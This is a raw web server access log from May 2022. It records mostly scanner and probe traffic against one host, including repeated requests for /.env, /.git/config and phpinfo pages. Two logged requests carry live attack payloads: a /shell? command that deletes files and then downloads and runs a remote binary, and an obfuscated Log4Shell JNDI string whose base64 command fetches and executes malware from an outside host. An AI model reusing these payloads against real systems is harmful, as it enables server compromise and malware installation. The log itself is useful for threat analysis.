175.177.44.149 - - [08/May/2022:06:45:04 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:45:56 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:06:46:05 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:46:57 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:06:47:54 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:48:45 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:06:49:49 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:49:50 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:49:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:49:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:49:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:49:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:49:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:50:43 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:06:51:57 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:51:58 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:51:58 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:51:58 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:52:05 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:52:06 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:52:06 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:52:06 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:52:07 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:06:52:58 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:07:04:09 +0000] "GET /templates/base.html HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:04:15 +0000] "GET /templates/ HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:05:07 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:07:05:48 +0000] "GET /templates/ HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:05:50 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:06:42 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:07:07:22 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:07:31 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:07:32 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:08:23 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:07:09:55 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:09:56 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:09:56 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:10:48 +0000] "-" 408 0 "-" "-"
175.177.44.149 - - [08/May/2022:07:50:40 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
175.177.44.149 - - [08/May/2022:07:51:31 +0000] "-" 408 0 "-" "-"
45.174.83.32 - - [08/May/2022:08:17:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.254.196.223 - - [08/May/2022:08:52:12 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [08/May/2022:08:52:13 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
79.120.160.80 - - [08/May/2022:09:11:22 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
195.32.50.126 - - [08/May/2022:09:20:26 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
162.142.125.221 - - [08/May/2022:09:31:48 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
162.142.125.221 - - [08/May/2022:09:31:49 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.221 - - [08/May/2022:09:31:49 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
128.14.209.162 - - [08/May/2022:11:11:14 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
24.59.83.11 - - [08/May/2022:11:38:17 +0000] "POST /editBlackAndWhiteList HTTP/1.1" 500 803 "-" "Abyssal"
185.254.196.223 - - [08/May/2022:11:54:26 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [08/May/2022:11:54:26 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.56.57.106 - - [08/May/2022:11:59:16 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
103.254.56.214 - - [08/May/2022:12:02:30 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.46.255.49 - - [08/May/2022:12:46:03 +0000] "GET / HTTP/1.1" 500 803 "-" "libwww-perl/6.62"
165.232.184.49 - - [08/May/2022:13:26:56 +0000] "GET /_ignition/execute-solution HTTP/1.1" 500 803 "-" "python-requests/2.22.0"
165.232.184.49 - - [08/May/2022:13:26:56 +0000] "GET / HTTP/1.1" 500 803 "-" "python-requests/2.22.0"
185.254.196.223 - - [08/May/2022:14:54:09 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [08/May/2022:14:54:11 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.213.176 - - [08/May/2022:15:25:10 +0000] "MGLNDD_174.138.17.206_80\n" 400 488 "-" "-"
222.104.66.6 - - [08/May/2022:15:56:59 +0000] "POST /editBlackAndWhiteList HTTP/1.1" 500 805 "-" "Abyssal"
109.111.158.155 - - [08/May/2022:16:09:46 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
123.54.16.15 - - [08/May/2022:16:47:30 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
51.79.29.48 - - [08/May/2022:16:50:44 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [08/May/2022:16:50:44 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.204.195.5 - - [08/May/2022:16:56:32 +0000] "GET /.git/config HTTP/1.1" 500 803 "-" "python-requests/2.22.0"
192.53.171.56 - - [08/May/2022:17:28:03 +0000] "\x16\x03" 400 488 "-" "-"
192.53.171.56 - - [08/May/2022:17:28:04 +0000] "GET /Vkh3 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.53.171.56 - - [08/May/2022:17:28:04 +0000] "GET /aeIN HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
45.9.20.101 - - [08/May/2022:17:43:34 +0000] "GET /actuator/gateway/routes HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [08/May/2022:17:53:16 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [08/May/2022:17:53:17 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.32.197.84 - - [08/May/2022:18:06:41 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
65.154.226.170 - - [08/May/2022:18:19:08 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36"
40.115.126.83 - - [08/May/2022:18:54:46 +0000] "CONNECT surfshark.com:443 HTTP/1.1" 500 803 "-" "Java/1.8.0_331"
91.243.235.53 - - [08/May/2022:18:57:00 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
188.165.87.106 - - [08/May/2022:19:26:02 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
128.1.248.42 - - [08/May/2022:20:10:39 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.104.138.223 - - [08/May/2022:20:19:05 +0000] "GET /fuN3 HTTP/1.0" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
185.254.196.223 - - [08/May/2022:20:53:16 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [08/May/2022:20:53:17 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.223.229.132 - - [08/May/2022:20:58:33 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
198.235.24.21 - - [08/May/2022:20:59:35 +0000] "GET / HTTP/1.1" 500 808 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
130.211.54.158 - - [08/May/2022:21:05:28 +0000] "GET / HTTP/1.1" 500 803 "-" "python-requests/2.27.1"
91.225.159.170 - - [08/May/2022:21:56:19 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
51.79.29.48 - - [08/May/2022:23:38:18 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [08/May/2022:23:38:19 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.124.7.9 - - [08/May/2022:23:48:27 +0000] "GET http://example.com/ HTTP/1.1" 500 800 "-" "Go-http-client/1.1"
128.14.134.170 - - [08/May/2022:23:50:47 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [08/May/2022:23:54:13 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [08/May/2022:23:54:14 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
112.46.68.105 - - [09/May/2022:00:33:23 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
3.137.188.46 - - [09/May/2022:00:33:39 +0000] "HEAD / HTTP/1.1" 500 171 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.137.188.46 - - [09/May/2022:00:33:39 +0000] "GET /info.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.137.188.46 - - [09/May/2022:00:33:40 +0000] "GET /phpinfo.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.137.188.46 - - [09/May/2022:00:33:40 +0000] "GET /_profiler/phpinfo HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
3.137.188.46 - - [09/May/2022:00:33:41 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
89.248.165.52 - - [09/May/2022:00:50:46 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [09/May/2022:00:51:07 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [09/May/2022:00:51:07 +0000] "CONNECT hotmail-com.olc.protection.outlook.com:25 HTTP/1.1" 500 827 "-" "-"
23.92.209.148 - - [09/May/2022:01:04:06 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.92.209.148 - - [09/May/2022:01:04:06 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.237.4.214 - - [09/May/2022:01:09:12 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
120.87.235.247 - - [09/May/2022:01:09:23 +0000] "POST /HNAP1/ HTTP/1.0" 500 803 "-" "-"
46.249.33.53 - - [09/May/2022:01:18:36 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 500 803 "http://174.138.17.206:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
51.79.29.48 - - [09/May/2022:01:37:49 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:01:37:50 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.21.216.183 - - [09/May/2022:01:46:46 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
51.79.29.48 - - [09/May/2022:03:32:07 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:03:32:08 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
217.196.24.199 - - [09/May/2022:03:33:17 +0000] "GET /TP/public/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:17 +0000] "GET /TP/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:18 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:18 +0000] "GET /html/public/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:19 +0000] "GET /public/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:19 +0000] "GET /TP/html/public/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:20 +0000] "GET /elrekt.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:20 +0000] "GET /index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
217.196.24.199 - - [09/May/2022:03:33:21 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
159.89.181.182 - - [09/May/2022:03:46:14 +0000] "HEAD / HTTP/1.1" 500 171 "-" "Java/1.8.0_191"
202.124.235.10 - - [09/May/2022:03:47:52 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
189.41.89.102 - - [09/May/2022:03:49:27 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://212.24.98.110/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" 500 798 "-" "Hello, world"
195.3.221.30 - - [09/May/2022:03:57:57 +0000] "GET / HTTP/1.1" 500 803 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvbGlic3NoMl94ODY7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L2xpYnNzaDJfeDg2OyBjaG1vZCA3NzcgbGlic3NoMl94ODY7IC4vbGlic3NoMl94ODYgc2V0dXA=}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvbGlic3NoMl94ODY7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L2xpYnNzaDJfeDg2OyBjaG1vZCA3NzcgbGlic3NoMl94ODY7IC4vbGlic3NoMl94ODYgc2V0dXA=}')"
162.142.125.213 - - [09/May/2022:04:06:31 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
162.142.125.213 - - [09/May/2022:04:06:31 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.213 - - [09/May/2022:04:06:32 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
89.248.165.52 - - [09/May/2022:04:33:40 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [09/May/2022:04:34:00 +0000] "-" 408 0 "-" "-"
89.248.165.52 - - [09/May/2022:04:34:00 +0000] "CONNECT 85.206.160.115:80 HTTP/1.1" 500 803 "-" "-"
71.6.232.7 - - [09/May/2022:04:54:17 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
51.79.29.48 - - [09/May/2022:05:25:47 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:05:25:47 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:05:53:26 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:05:53:26 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.86.160.154 - - [09/May/2022:06:02:16 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
192.86.160.154 - - [09/May/2022:06:02:16 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
192.86.160.154 - - [09/May/2022:06:11:41 +0000] "OPTIONS / HTTP/1.1" 500 803 "-" "Microsoft-WebDAV-MiniRedir/10.0.19043"
192.86.160.154 - - [09/May/2022:06:11:42 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
